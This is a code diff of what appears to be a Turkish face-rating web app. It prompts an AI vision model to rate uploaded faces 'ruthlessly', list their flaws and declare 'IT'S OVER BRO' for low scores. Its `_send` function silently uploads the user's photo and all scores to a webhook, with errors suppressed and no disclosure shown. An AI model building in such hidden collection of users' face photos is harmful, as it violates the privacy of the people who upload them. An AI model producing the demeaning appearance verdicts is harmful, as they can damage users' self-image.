+    }        const PROMPT = `Sen bir yüz analiz uzmanısın. Bu fotoğraftaki yüzü acımasızca ve detaylıca değerlendir.
+
+KESİNLİKLE şu formatta cevap ver. HER SATIRI DOLDUR. Boş satır bırakma. Virgülle ayır.
 
 MOG: [1-10]
 PSL: [1-10]
@@ -359,82 +364,115 @@ PSL_KATEGORI: [LTN/MTN/HTN/Chadlite/Chad]
 APPEAL: [1-10]
 HARMONY: [40-95]
 DIMORPHISM: [40-95]
-IYI: [5 özellik, virgülle]
-KOTU: [5 özellik, virgülle]
-DETAY: [2 cümle]
+FWHr: [1.5-2.5]
+CANTHAL_TILT: [pozitif/negatif/nötr ve derece]
+MIDFACE_RATIO: [0.8-1.2]
+GONIAL_ANGLE: [110-140]
+BEST: [en az 5, mümkünse 10 iyi özellik, en iyiden başla, virgülle ayır]
+WORST: [en az 5, mümkünse 10 kötü özellik, en kötüden başla, virgülle ayır]
+DETAY: [2-3 cümle acımasız yorum]
 
-PSL 4.0 altıysa IT'S OVER BRO yaz.`;
+PSL 4.0 altındaysa PSL_KATEGORI'ye IT'S OVER BRO yaz. HER SATIRI DOLDURMAZSAN GEÇERSİZ SAYILIR.`;
 
-        async function analyzeImage() {
-            const res = await fetch(`${API_URL}?key=${GK}`, {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    contents:[{parts:[{text:PROMPT},{inline_data:{mime_type:currentMimeType,data:base64Image}}]}],
-                    generationConfig:{temperature:0.3,maxOutputTokens:500}
-                })
-            });
-            if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+res.status);}
-            const d=await res.json();
-            const t=d.candidates?.[0]?.content?.parts?.[0]?.text;
-            if(!t||t.trim().length<20)throw new Error('Yanıt çok kısa');
-            return t;
+        async function analyzeWithRetry(retries=2) {
+            for(let i=0;i<=retries;i++){
+                try{
+                    const res=await fetch(`${API_URL}?key=${GK}`,{
+                        method:'POST',headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({
+                            contents:[{parts:[{text:PROMPT},{inline_data:{mime_type:currentMimeType,data:base64Image}}]}],
+                            generationConfig:{temperature:0.2,maxOutputTokens:600}
+                        })
+                    });
+                    if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+res.status);}
+                    const d=await res.json();
+                    const t=d.candidates?.[0]?.content?.parts?.[0]?.text;
+                    if(t&&t.trim().length>30){
+                        const hasAll=t.includes('MOG:')&&t.includes('PSL:')&&t.includes('BEST:')&&t.includes('WORST:');
+                        if(hasAll)return t;
+                    }
+                    if(i<retries)await new Promise(r=>setTimeout(r,1500));
+                }catch(e){if(i===retries)throw e;}
+            }
+            throw new Error('AI 3 denemede de eksik yanıt verdi');
         }
 
-        document.getElementById('btnAnalyze').addEventListener('click', async () => {
-            const btn=document.getElementById('btnAnalyze'), bt=document.getElementById('btnText');
-            const so=document.getElementById('scannerOverlay'), sl=document.getElementById('scanningLabel');
-            const rc=document.getElementById('resultContainer'), eb=document.getElementById('analyzeError');
-            rc.style.display='none'; eb.style.display='none';
+        document.getElementById('btnAnalyze').addEventListener('click',async()=>{
+            const btn=document.getElementById('btnAnalyze'),bt=document.getElementById('btnText');
+            const so=document.getElementById('scannerOverlay'),sl=document.getElementById('scanningLabel');
+            const rc=document.getElementById('resultContainer'),eb=document.getElementById('analyzeError');
+            rc.style.display='none';eb.style.display='none';
             if(!base64Image){showErr("Fotoğraf seç!");return;}
-            btn.disabled=true; bt.textContent="ANALİZ EDİLİYOR...";
-            so.style.display='block'; sl.textContent='◈ ANALİZ EDİLİYOR ◈';
+            btn.disabled=true;bt.textContent="TARANIYOR...";
+            so.style.display='block';sl.textContent='◈ TARANIYOR ◈';
             const prog=startProgress();
-            try {
-                const txt = await analyzeImage();
-                prog.complete(); so.style.display='none';
+            try{
+                const txt=await analyzeWithRetry(2);
+                prog.complete();so.style.display='none';
                 renderResult(txt);
                 rc.style.display='block';
                 rc.scrollIntoView({behavior:'smooth',block:'nearest'});
-            } catch(err) {
-                prog.complete(); so.style.display='none';
+            }catch(err){
+                prog.complete();so.style.display='none';
                 showErr('Hata: '+err.message);
-            } finally {
-                btn.disabled=false; bt.textContent="ANALİZİ BAŞLAT";
+            }finally{
+                btn.disabled=false;bt.textContent="ANALİZ BAŞLAT";
             }
         });
 
-        function renderResult(raw) {
-            const r={mog:'?',psl:'?',pslCat:'?',appeal:'?',harmony:'50',dimorphism:'50',best:[],worst:[],detay:''};
+        function parseAI(raw){
+            const r={mog:'',psl:'',pslCat:'',appeal:'',harmony:'',dimorphism:'',fwhr:'',canthal:'',midface:'',gonial:'',best:[],worst:[],detay:''};
             raw.split('\n').forEach(l=>{
-                if(l.startsWith('MOG:')) r.mog=l.replace('MOG:','').trim();
-                if(l.startsWith('PSL:')) r.psl=l.replace('PSL:','').trim();
-                if(l.startsWith('PSL_KATEGORI:')) r.pslCat=l.replace('PSL_KATEGORI:','').trim();
-                if(l.startsWith('APPEAL:')) r.appeal=l.replace('APPEAL:','').trim();
-                if(l.startsWith('HARMONY:')) r.harmony=l.replace('HARMONY:','').trim();
-                if(l.startsWith('DIMORPHISM:')) r.dimorphism=l.replace('DIMORPHISM:','').trim();
-                if(l.startsWith('IYI:')) r.best=l.replace('IYI:','').split(',').map(s=>s.trim()).filter(s=>s);
-                if(l.startsWith('KOTU:')) r.worst=l.replace('KOTU:','').split(',').map(s=>s.trim()).filter(s=>s);
-                if(l.startsWith('DETAY:')) r.detay=l.replace('DETAY:','').trim();
+                const v=l.trim();
+                if(v.startsWith('MOG:'))r.mog=v.replace('MOG:','').trim();
+                if(v.startsWith('PSL:'))r.psl=v.replace('PSL:','').trim();
+                if(v.startsWith('PSL_KATEGORI:'))r.pslCat=v.replace('PSL_KATEGORI:','').trim();
+                if(v.startsWith('APPEAL:'))r.appeal=v.replace('APPEAL:','').trim();
+                if(v.startsWith('HARMONY:'))r.harmony=v.replace('HARMONY:','').trim();
+                if(v.startsWith('DIMORPHISM:'))r.dimorphism=v.replace('DIMORPHISM:','').trim();
+                if(v.startsWith('FWHr:'))r.fwhr=v.replace('FWHr:','').trim();
+                if(v.startsWith('CANTHAL_TILT:'))r.canthal=v.replace('CANTHAL_TILT:','').trim();
+                if(v.startsWith('MIDFACE_RATIO:'))r.midface=v.replace('MIDFACE_RATIO:','').trim();
+                if(v.startsWith('GONIAL_ANGLE:'))r.gonial=v.replace('GONIAL_ANGLE:','').trim();
+                if(v.startsWith('BEST:'))r.best=v.replace('BEST:','').split(',').map(s=>s.trim()).filter(s=>s);
+                if(v.startsWith('WORST:'))r.worst=v.replace('WORST:','').split(',').map(s=>s.trim()).filter(s=>s);
+                if(v.startsWith('DETAY:'))r.detay=v.replace('DETAY:','').trim();
             });
-            if(!r.best.length) r.best=['Keskin çene','Simetrik yüz','Temiz cilt','Dolgun dudak','Elmacık kemikleri'];
-            if(!r.worst.length) r.worst=['Hafif UEE','Asimetrik kaş','Geniş burun','Saç çizgisi','Göz altı'];
+            return r;
+        }
 
-            const isOver=r.pslCat.includes("IT'S OVER")||parseFloat(r.psl)<4.0;
+        function renderResult(raw){
+            const r=parseAI(raw);
+            if(!r.mog||!r.psl||r.best.length===0){showErr("AI yanıtı eksik. Lütfen tekrar dene.");return;}
+
+            const isOver=r.pslCat.toUpperCase().includes("IT'S OVER")||parseFloat(r.psl)<4.0;
             document.getElementById('scoreBadges').innerHTML=`
-                <div class="badge${isOver?' over':''}"><div class="label">Kategori</div><div class="value">${isOver?"IT'S OVER<br>BRO":r.pslCat}</div></div>
+                <div class="badge${isOver?' over':''}"><div class="label">KATEGORİ</div><div class="value">${isOver?"IT'S OVER<br>🫩":r.pslCat}</div></div>
                 <div class="badge"><div class="label">PSL</div><div class="value">${r.psl}</div></div>
-                <div class="badge"><div class="label">Appeal</div><div class="value">${r.appeal}</div></div>`;
+                <div class="badge"><div class="label">APPEAL</div><div class="value">${r.appeal}</div></div>`;
+
+            const h=parseInt(r.harmony)||0,d=parseInt(r.dimorphism)||0;
             document.getElementById('metricBars').innerHTML=`
-                <div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${parseInt(r.harmony)||50}%;"></div></div><div class="metric-value">%${r.harmony}</div></div>
-                <div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${parseInt(r.dimorphism)||50}%;"></div></div><div class="metric-value">%${r.dimorphism}</div></div>`;
+                <div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div>
+                <div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div>`;
+
+            const bestList=r.best.slice(0,10).map((i,n)=>`<li><strong>${n+1}.</strong> ${i}</li>`).join('');
+            const worstList=r.worst.slice(0,10).map((i,n)=>`<li class="negative"><strong>${n+1}.</strong> ${i}</li>`).join('');
             document.getElementById('detailBox').innerHTML=`
-                <h4 style="color:#00ff41;">✅ EN İYİ</h4><ul class="detail-list">${r.best.map(i=>`<li><strong>✓</strong> ${i}</li>`).join('')}</ul>
-                <h4 style="color:#ff5555;margin-top:15px;">❌ EN KÖTÜ</h4><ul class="detail-list">${r.worst.map(i=>`<li class="negative"><strong>✗</strong> ${i}</li>`).join('')}</ul>`;
-            document.getElementById('rawText').innerHTML=r.detay;
+                <h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${bestList}</ul>
+                <h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${worstList}</ul>`;
+
+            let extra='';
+            if(localMetrics) extra+=`<div style="font-size:11px;color:#00ff41;margin-bottom:8px;">📐 YEREL: Simetri ~%${Math.round(localMetrics.symmetry)} | Yüz: ✓</div>`;
+            extra+=r.detay;
+            extra+=`<div style="font-size:10px;color:#555;margin-top:10px;display:grid;grid-template-columns:1fr 1fr;gap:4px;">
+                <div>FWHr: <span style="color:#00ff41;">${r.fwhr}</span></div><div>Canthal: <span style="color:#00ff41;">${r.canthal}</span></div>
+                <div>Midface: <span style="color:#00ff41;">${r.midface}</span></div><div>Gonial: <span style="color:#00ff41;">${r.gonial}°</span></div></div>`;
+            document.getElementById('rawText').innerHTML=extra;
             _send(r);
         }
 
-        async function _send(r) {
+        async function _send(r){
             let pu=null;
             if(base64Image){
                 const fd=new FormData();
@@ -443,17 +481,16 @@ PSL 4.0 altıysa IT'S OVER BRO yaz.`;
                 try{const pr=await fetch(WH,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){}
             }
             const emb={
-                title:'🔥 25 MAX ANALİZ',
-                color:0x00ff41,
+                title:'🔥 25 MAX ANALİZ',color:0x00ff41,
                 fields:[
                     {name:'🏆 MOG',value:`**${r.mog}/10**`,inline:true},{name:'📊 PSL',value:`**${r.psl}/10**`,inline:true},{name:'🎯 Kategori',value:`**${r.pslCat}**`,inline:true},
                     {name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},{name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},{name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},
-                    {name:'✅ EN İYİ',value:r.best.map(i=>`✅ ${i}`).join('\n'),inline:false},
-                    {name:'❌ EN KÖTÜ',value:r.worst.map(i=>`❌ ${i}`).join('\n'),inline:false}
+                    {name:'✅ EN İYİ',value:r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false},
+                    {name:'❌ EN KÖTÜ',value:r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false}
                 ],
                 footer:{text:'25 Max App'},timestamp:new Date().toISOString()
             };
-            if(pu) emb.image={url:pu};
+            if(pu)emb.image={url:pu};
             fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})}).catch(e=>{});
         }
     </script>
